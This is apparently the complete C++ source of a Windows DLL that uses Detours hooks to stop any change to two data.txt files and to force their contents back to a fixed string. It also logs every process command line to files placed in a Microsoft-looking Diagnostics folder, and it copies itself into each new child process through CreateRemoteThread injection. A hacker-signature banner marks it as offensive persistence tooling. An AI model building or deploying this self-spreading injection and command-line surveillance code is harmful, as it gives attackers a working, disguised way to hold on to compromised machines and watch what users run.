#define _WIN32_WINNT 0x0600 
#define WIN32_LEAN_AND_MEAN
#include <windows.h> 
#include <detours.h>
#include <string>
#include <fstream>
#include <iostream> 
#include <cstring>

#define PROTECTED_FILE_1 L"C:\\data.txt" 
#define PROTECTED_FILE_2 L"C:\\Users\\Administrator\\data.txt"
#define PROTECTED_CONTENT "secure data\n"

#define FILE_LOG "C:\\ProgramData\\Microsoft\\Diagnostics\\file_protect.log"
#define CMD_LOG  "C:\\ProgramData\\Microsoft\\Diagnostics\\createprocess.log" 

#ifndef FILE_NAME_NORMALIZED
#define FILE_NAME_NORMALIZED 0x0 
#endif

#ifndef HAVE_GETFINALPATHBYHANDLEW
extern "C" __declspec(dllimport) DWORD WINAPI GetFinalPathNameByHandleW(
    HANDLE hFile, LPWSTR lpszFilePath, DWORD cchFilePath, DWORD dwFlags);
#endif

static char dllPath[MAX_PATH] = {0};

static bool EqualsProtectedPath(const std::wstring &p) {
    const std::wstring prefix = L"\\\\?\\";
    std::wstring s = p;
    if (s.rfind(prefix, 0) == 0) {
        s = s.substr(prefix.size());
    }

    const std::wstring uncPrefix = L"UNC\\";
    if (s.rfind(uncPrefix, 0) == 0) {
        s = L"\\" + s.substr(3);
    }
    return (_wcsicmp(s.c_str(), PROTECTED_FILE_1) == 0) ||
           (_wcsicmp(s.c_str(), PROTECTED_FILE_2) == 0);
}

bool IsProtectedFile(LPCWSTR file) {
    if (!file) return false;
    return (_wcsicmp(file, PROTECTED_FILE_1) == 0 ||
            _wcsicmp(file, PROTECTED_FILE_2) == 0);
}

void LogToFile(const char* path, const char* msg) {
    std::ofstream log(path, std::ios::app);
    if (log.is_open()) {
        log << msg << std::endl;
    }
}



typedef HANDLE (WINAPI *CreateFileW_t)(
    LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
static CreateFileW_t Real_CreateFileW = CreateFileW;

typedef BOOL (WINAPI *WriteFile_t)(
    HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
static WriteFile_t Real_WriteFile = WriteFile;

typedef BOOL (WINAPI *DeleteFileW_t)(LPCWSTR);
static DeleteFileW_t Real_DeleteFileW = DeleteFileW;

typedef BOOL (WINAPI *SetFileAttributesW_t)(LPCWSTR, DWORD);
static SetFileAttributesW_t Real_SetFileAttributesW = SetFileAttributesW;

typedef BOOL (WINAPI *MoveFileW_t)(LPCWSTR, LPCWSTR);
static MoveFileW_t Real_MoveFileW = MoveFileW;

typedef BOOL (WINAPI *MoveFileExW_t)(LPCWSTR, LPCWSTR, DWORD);
static MoveFileExW_t Real_MoveFileExW = MoveFileExW;

typedef BOOL (WINAPI *CreateProcessW_t)(
    LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
static CreateProcessW_t Real_CreateProcessW = CreateProcessW;

BOOL InjectDLL(DWORD pid, const char* dllPath);



HANDLE WINAPI My_CreateFileW(
    LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile
) {
    if (lpFileName && (dwDesiredAccess & (GENERIC_WRITE | DELETE))) {
        if (IsProtectedFile(lpFileName)) {
            LogToFile(FILE_LOG, "[BLOCKED] CreateFileW Write/Delete attempt");
            SetLastError(ERROR_ACCESS_DENIED);
            return INVALID_HANDLE_VALUE;
        }
    }
    return Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode,
                            lpSecurityAttributes, dwCreationDisposition,
                            dwFlagsAndAttributes, hTemplateFile);
}

BOOL ForceWriteProtectedContentToHandle(HANDLE hFile) {
    if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) return FALSE;

    LARGE_INTEGER liZero; liZero.QuadPart = 0;
    if (!SetFilePointerEx(hFile, liZero, NULL, FILE_BEGIN)) {
        return FALSE;
    }

    if (!SetEndOfFile(hFile)) {
        return FALSE;
    }

    DWORD bytesWritten = 0;
    BOOL res = Real_WriteFile(hFile, PROTECTED_CONTENT,
                              (DWORD)strlen(PROTECTED_CONTENT),
                              &bytesWritten, NULL);
    return res;
}

BOOL WINAPI My_WriteFile(
    HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped
) {
    if (hFile && hFile != INVALID_HANDLE_VALUE) {
        WCHAR filePath[MAX_PATH] = {0};
        DWORD got = 0;
        got = GetFinalPathNameByHandleW(hFile, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
        if (got > 0 && got < MAX_PATH) {
            if (EqualsProtectedPath(std::wstring(filePath))) {
                BOOL forced = ForceWriteProtectedContentToHandle(hFile);
                if (lpNumberOfBytesWritten) {
                    *lpNumberOfBytesWritten = (DWORD)strlen(PROTECTED_CONTENT);
                }
                LogToFile(FILE_LOG, "[BLOCKED] WriteFile"); 
                SetLastError(ERROR_ACCESS_DENIED);
                return FALSE;
            }
        }
    }
    return Real_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

BOOL WINAPI My_DeleteFileW(LPCWSTR lpFileName) {
    if (lpFileName && IsProtectedFile(lpFileName)) {
        LogToFile(FILE_LOG, "[BLOCKED] DeleteFileW");
        SetLastError(ERROR_ACCESS_DENIED);
        return FALSE;
    }
    return Real_DeleteFileW(lpFileName);
}

BOOL WINAPI My_SetFileAttributesW(LPCWSTR lpFileName, DWORD dwFileAttributes) {
    if (lpFileName && IsProtectedFile(lpFileName)) {
        LogToFile(FILE_LOG, "[BLOCKED] SetFileAttributesW");
        SetLastError(ERROR_ACCESS_DENIED);
        return FALSE;
    }
    return Real_SetFileAttributesW(lpFileName, dwFileAttributes);
}

BOOL WINAPI My_MoveFileW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName) {
    if ((lpExistingFileName && IsProtectedFile(lpExistingFileName)) ||
        (lpNewFileName && IsProtectedFile(lpNewFileName))) {
        LogToFile(FILE_LOG, "[BLOCKED] MoveFileW");
        SetLastError(ERROR_ACCESS_DENIED);
        return FALSE;
    }
    return Real_MoveFileW(lpExistingFileName, lpNewFileName);
}

BOOL WINAPI My_MoveFileExW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags) {
    if ((lpExistingFileName && IsProtectedFile(lpExistingFileName)) ||
        (lpNewFileName && IsProtectedFile(lpNewFileName))) {
        LogToFile(FILE_LOG, "[BLOCKED] MoveFileExW");
        SetLastError(ERROR_ACCESS_DENIED);
        return FALSE;
    }
    return Real_MoveFileExW(lpExistingFileName, lpNewFileName, dwFlags);
}

BOOL WINAPI My_CreateProcessW(
    LPCWSTR lpApplicationName, LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
) {
    if (lpCommandLine) {
        char commandLine[1024] = {0};
        WideCharToMultiByte(CP_UTF8, 0, lpCommandLine, -1, commandLine, sizeof(commandLine), NULL, NULL);
        char logMessage[1024];
        snprintf(logMessage, sizeof(logMessage), "CreateProcess: %s", commandLine);
        LogToFile(CMD_LOG, logMessage);
    } else {
        LogToFile(CMD_LOG, "CreateProcess called with no command line");
    }

    BOOL result = Real_CreateProcessW(
        lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
        bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory,
        lpStartupInfo, lpProcessInformation
    );

    if (result && lpProcessInformation) {
        char logMsg[256];
        snprintf(logMsg, sizeof(logMsg), "Injecting DLL into new process: %lu", lpProcessInformation->dwProcessId);
        LogToFile(CMD_LOG, logMsg);
        InjectDLL(lpProcessInformation->dwProcessId, dllPath);
    }

    return result;
}



BOOL InjectDLL(DWORD pid, const char* dllPathLocal) {
    if (!dllPathLocal || pid == 0) return FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                  PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                                  FALSE, pid);
    if (!hProcess) return FALSE;

    SIZE_T size = strlen(dllPathLocal) + 1;
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) { CloseHandle(hProcess); return FALSE; }

    if (!WriteProcessMemory(hProcess, remoteAddr, dllPathLocal, size, NULL)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)LoadLibraryA,
                                        remoteAddr, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }
    VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}



static void PrintBanner() {
    wprintf(L"\n\n==============================================================================\n");
    wprintf(L"   ┌∩┐(◣_◢)┌∩┐\n");
    wprintf(L"\n");
    wprintf(L"   I didn't make the system, it made me who I am\n");
    wprintf(L"   Keep the name echo in your minds: Trevohack\n");
    wprintf(L"\n");
    wprintf(L"==============================================================================\n\n");
    LogToFile(FILE_LOG, "[INIT] FileProtectDLL hooks installed and active.");
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        GetModuleFileNameA(hinstDLL, dllPath, (DWORD)sizeof(dllPath));

        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());

        DetourAttach((PVOID*)&Real_CreateFileW, (PVOID)My_CreateFileW);
        DetourAttach((PVOID*)&Real_WriteFile, (PVOID)My_WriteFile);
        DetourAttach((PVOID*)&Real_DeleteFileW, (PVOID)My_DeleteFileW);
        DetourAttach((PVOID*)&Real_SetFileAttributesW, (PVOID)My_SetFileAttributesW);
        DetourAttach((PVOID*)&Real_MoveFileW, (PVOID)My_MoveFileW);
        DetourAttach((PVOID*)&Real_MoveFileExW, (PVOID)My_MoveFileExW);
        DetourAttach((PVOID*)&Real_CreateProcessW, (PVOID)My_CreateProcessW);

        DetourTransactionCommit();

        PrintBanner();
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());

        DetourDetach((PVOID*)&Real_CreateFileW, (PVOID)My_CreateFileW);
        DetourDetach((PVOID*)&Real_WriteFile, (PVOID)My_WriteFile);
        DetourDetach((PVOID*)&Real_DeleteFileW, (PVOID)My_DeleteFileW);
        DetourDetach((PVOID*)&Real_SetFileAttributesW, (PVOID)My_SetFileAttributesW);
        DetourDetach((PVOID*)&Real_MoveFileW, (PVOID)My_MoveFileW);
        DetourDetach((PVOID*)&Real_MoveFileExW, (PVOID)My_MoveFileExW);
        DetourDetach((PVOID*)&Real_CreateProcessW, (PVOID)My_CreateProcessW);

        DetourTransactionCommit();
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void CALLBACK RunHooks(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    DllMain(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
} 
